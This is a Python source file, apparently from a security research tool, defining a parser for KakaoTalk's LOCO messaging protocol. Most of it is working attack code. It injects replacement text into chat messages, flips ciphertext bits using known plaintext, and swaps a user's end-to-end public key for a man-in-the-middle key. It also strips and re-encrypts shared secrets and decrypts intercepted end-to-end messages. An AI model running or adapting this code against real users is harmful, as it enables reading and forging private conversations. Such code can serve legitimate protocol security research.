import base64
import logging
import struct

import bson
from lib.crypto_utils import (
    aes_decrypt,
    aes_e2e_decrypt,
    compute_nonce,
    get_clean_public_key,
    rsa_decrypt,
    rsa_encrypt,
)
from lib.loco_packet import LocoEncryptedPacket, LocoHandshakePacket, LocoPacket


class LocoParser:
    def __init__(self):
        self.loco_packet = LocoPacket()
        self.loco_encrypted_packet = LocoEncryptedPacket()
        self.handshake_packet = LocoHandshakePacket()

    def parse_loco_packet(self, data):
        if not data:
            logging.error("Couldn't parse LOCO encrypted packet: Packet data is None.")
            return None

        try:
            identifier = struct.unpack("<I", data[:4])[0]
            status_code = struct.unpack("<H", data[4:6])[0]
            loco_command = data[6:17].decode().replace("\0", "")
            body_type = struct.unpack("<b", data[17:18])[0]
            body_length = struct.unpack("<i", data[18:22])[0]
            body_payload = data[22:]

            return LocoPacket(
                identifier,
                status_code,
                loco_command,
                body_type,
                body_length,
                body_payload,
            )
        except Exception as general_exception:
            logging.error(
                "Couldn't parse LOCO packet: %s \nAre you running Frida in parallel to patch the AES key?",
                general_exception,
            )

            return None

    def parse_loco_encrypted_packet(self, data):
        if not data:
            logging.error("Couldn't parse LOCO encrypted packet: Packet data is None.")
            return None

        try:
            length = struct.unpack("<I", data[0:4])[0]
            iv = data[4:20]
            payload = data[20:]

            if length > (len(data) - 4):
                is_fragmented = True
            else:
                is_fragmented = False

            return LocoEncryptedPacket(length, iv, payload, is_fragmented)
        except Exception as general_exception:
            logging.error("Couldn't parse LOCO encrypted packet: %s", general_exception)
            return None

    def parse_handshake_packet(self, data):
        if not data:
            logging.error("Couldn't parse LOCO handshake packet: Packet data is None.")
            return None

        try:
            handshake_type = struct.unpack("<I", data[4:8])[0]
            block_cipher_mode = struct.unpack("<I", data[8:12])[0]
            payload = data[22:]
            return LocoHandshakePacket(handshake_type, block_cipher_mode, payload)
        except Exception as general_exception:
            logging.error("Couldn't parse LOCO handshake packet: %s", general_exception)
            return None

    def parse(self, data):
        self.loco_encrypted_packet = self.parse_loco_encrypted_packet(data)

        if self.loco_encrypted_packet.length == 256:
            self.handshake_packet = self.parse_handshake_packet(data)
        else:
            decrypted_payload = aes_decrypt(
                self.loco_encrypted_packet.payload, self.loco_encrypted_packet.iv
            )
            self.loco_packet = self.parse_loco_packet(decrypted_payload)

    def inject_message(self, trigger_message, payload) -> bytes:
        if not self.loco_packet:
            return None

        if self.loco_packet.loco_command not in ["MSG", "LOGINLIST", "WRITE"]:
            return None

        body_json = self.loco_packet.body_payload

        # Read message from "MSG" LOCO packet
        if (
            "chatLog" in body_json
            and body_json["chatLog"]["message"] == trigger_message
        ):
            body_json["chatLog"]["message"] = payload

        # Read message from "WRITE" LOCO packet
        if "msg" in body_json and body_json["msg"] == trigger_message:
            body_json["msg"] = payload

        # Read message from "LOGINLIST" LOCO packet
        if "chatDatas" in body_json and body_json["chatDatas"]:
            if (
                "l" in body_json["chatDatas"][0]
                and "message" in body_json["chatDatas"][0]["l"]
                and body_json["chatDatas"][0]["l"]["message"] == trigger_message
            ):
                body_json["chatDatas"][0]["l"]["message"] = payload

        self.loco_packet.body_payload = bson.dumps(body_json)
        self.loco_packet.body_length = len(self.loco_packet.body_payload)
        return self.loco_encrypted_packet.create_new_packet(self.loco_packet)

    def _xor(self, param1, param2):
        return bytes((x ^ y) for (x, y) in zip(param1, param2))

    def flip_bits(self, trigger_message):
        if not self.loco_packet:
            return None

        if self.loco_packet.loco_command not in ["MSG", "WRITE"]:
            return None

        body_json = self.loco_packet.body_payload

        # Read message from "MSG" LOCO packet
        if (
            "chatLog" in body_json
            and body_json["chatLog"]["message"] != trigger_message
        ):
            return None

        # Patch size of the "message" field value
        # body = bytearray(self.loco_packet.body_payload)
        # body[128:129] = b"\x0F"
        # self.loco_packet.body_payload = bytes(body)
        # loco_encrypted = aes_encrypt(self.loco_packet.get_packet_bytes(), self.loco_encrypted_packet.iv)
        loco_encrypted = self.loco_encrypted_packet.payload

        logging.warning("Flipping bits with known plaintext: %s", trigger_message)

        ciphertext = bytearray(loco_encrypted)
        p11 = b"AAAAAAAAAAAAAAAA"
        c11 = ciphertext[0xA0 : 0xA0 + 0x10]
        x = self._xor(c11, p11)
        c11_new = self._xor(x, b"BBBBBBBB\x00\x05\x00\x11\x00\x00\x00\x00")
        ciphertext[0xA0 : 0xA0 + 0x10] = c11_new
        self.loco_encrypted_packet.payload = bytes(ciphertext)
        return self.loco_encrypted_packet.get_packet_bytes()

    def inject_public_key(self, key_pair):
        if not self.loco_packet:
            logging.error("LOCO packet data is None.")
            return (None, None)

        if isinstance(self.loco_packet.body_payload, bytes):
            self.loco_packet.body_payload = bson.loads(self.loco_packet.body_payload)

        if not self.loco_packet.loco_command in {
            "GETPK",
            "GETLPK",
            "SCREATE",
            "CHATONROOM",
        }:
            return (None, None)

        if not self.loco_packet.body_payload.get("pi"):
            logging.warning(
                "There's no public key in %s packet. No need to replace it.",
                self.loco_packet.loco_command,
            )
            return (None, None)

        mitm_public_key_cleaned = get_clean_public_key(key_pair)

        # logging.info("MITM public key: %s", mitm_public_key_cleaned)

        original_public_key = self.loco_packet.body_payload["pi"][0]["ek"]
        self.loco_packet.body_payload["pi"][0]["ek"] = mitm_public_key_cleaned

        if not len(original_public_key) == len(mitm_public_key_cleaned):
            logging.error("Original and MITM public key don't have the same length!")
            return (None, None)

        self.loco_packet.body_payload = bson.dumps(self.loco_packet.body_payload)
        self.loco_packet.body_length = len(self.loco_packet.body_payload)

        return (
            original_public_key.encode(),
            self.loco_encrypted_packet.create_new_packet(self.loco_packet),
        )

    def remove_stored_shared_secret(self):
        if not self.loco_packet:
            return None

        if isinstance(self.loco_packet.body_payload, bytes):
            logging.error("Couldn't parse LOCO packet body.")
            return None

        if self.loco_packet.loco_command not in {"SCREATE", "CHATONROOM"}:
            return None

        if self.loco_packet.body_payload.get("si"):
            logging.warning(
                "Removing stored shared secret from %s packet...",
                self.loco_packet.loco_command,
            )
            self.loco_packet.body_payload.pop("si")

        self.loco_packet.body_payload = bson.dumps(self.loco_packet.body_payload)
        self.loco_packet.body_length = len(self.loco_packet.body_payload)

        return self.loco_encrypted_packet.create_new_packet(self.loco_packet)

    def get_shared_secret(self, rsa_key_pair) -> bytes:
        shared_secret = None

        if not self.loco_packet:
            return None

        if isinstance(self.loco_packet.body_payload, bytes):
            logging.error("Couldn't parse LOCO packet body.")
            return None

        if self.loco_packet.loco_command != "SETSK":
            return None

        if not self.loco_packet.body_payload.get("sk"):
            logging.error("No shared secret in SETSK packet.")
            return None

        if len(self.loco_packet.body_payload.get("sk")) != 2:
            logging.error("Only one encrypted shared secret in 'sk' list.")
            return None

        encrypted_shared_secret = base64.b64decode(
            self.loco_packet.body_payload["sk"][0]
        )

        try:
            shared_secret = rsa_decrypt(encrypted_shared_secret, rsa_key_pair)
        except ValueError as value_error:
            # logging.exception(value_error)
            return None

        return base64.b64encode(shared_secret)

    def encrypt_shared_secret(self, shared_secret: bytes, public_key: bytes):
        if not self.loco_packet:
            return None

        if isinstance(self.loco_packet.body_payload, bytes):
            logging.error("Couldn't parse LOCO packet body.")
            return None

        if self.loco_packet.loco_command != "SETSK":
            return None

        shared_secret = base64.b64encode(
            rsa_encrypt(shared_secret, public_key.decode("utf-8"), True)
        )
        self.loco_packet.body_payload["sk"][0] = shared_secret

        self.loco_packet.body_payload = bson.dumps(self.loco_packet.body_payload)
        self.loco_packet.body_length = len(self.loco_packet.body_payload)

        return self.loco_encrypted_packet.create_new_packet(self.loco_packet)

    def get_decrypted_e2e_message(self, e2e_encryption_key, shared_secret):
        if not self.loco_packet:
            return None

        if not self.loco_packet.loco_command in {"SWRITE", "MSG"}:
            return None

        if not self.loco_packet.body_payload:
            return None

        # Get sender's E2E message
        if self.loco_packet.loco_command == "SWRITE" and isinstance(
            self.loco_packet.body_payload.get("m"), (bytes, str)
        ):
            secret_message = base64.b64decode(self.loco_packet.body_payload["m"])
            msg_id = self.loco_packet.body_payload["mid"]
            chat_id = self.loco_packet.body_payload["c"]

        # Get receiver's E2E message
        if (
            self.loco_packet.loco_command == "MSG"
            and self.loco_packet.body_payload.get("chatLog")
        ):
            secret_message = base64.b64decode(
                self.loco_packet.body_payload["chatLog"]["message"]
            )
            msg_id = self.loco_packet.body_payload["chatLog"]["msgId"]
            chat_id = self.loco_packet.body_payload["chatId"]

        # KakaoTalk uses either the msgId or chatId as an input seed to compute the nonce
        nonce_with_msg_id = compute_nonce(shared_secret, msg_id)
        nonce_with_chat_id = compute_nonce(shared_secret, chat_id)

        # logging.info("Nonce with msgId: %s", base64.b64encode(nonce_with_msg_id))
        # logging.info("Nonce with chatId: %s", base64.b64encode(nonce_with_chat_id))

        decrypted_msg_1 = aes_e2e_decrypt(
            secret_message, e2e_encryption_key, nonce_with_msg_id
        )
        decrypted_msg_2 = aes_e2e_decrypt(
            secret_message, e2e_encryption_key, nonce_with_chat_id
        )

        try:
            decoded_msg = decrypted_msg_1.decode("utf-8")
        except UnicodeDecodeError:
            decoded_msg = decrypted_msg_2.decode("utf-8")

        return decoded_msg

    def bson_encode(self, data):
        return bson.dumps(data)
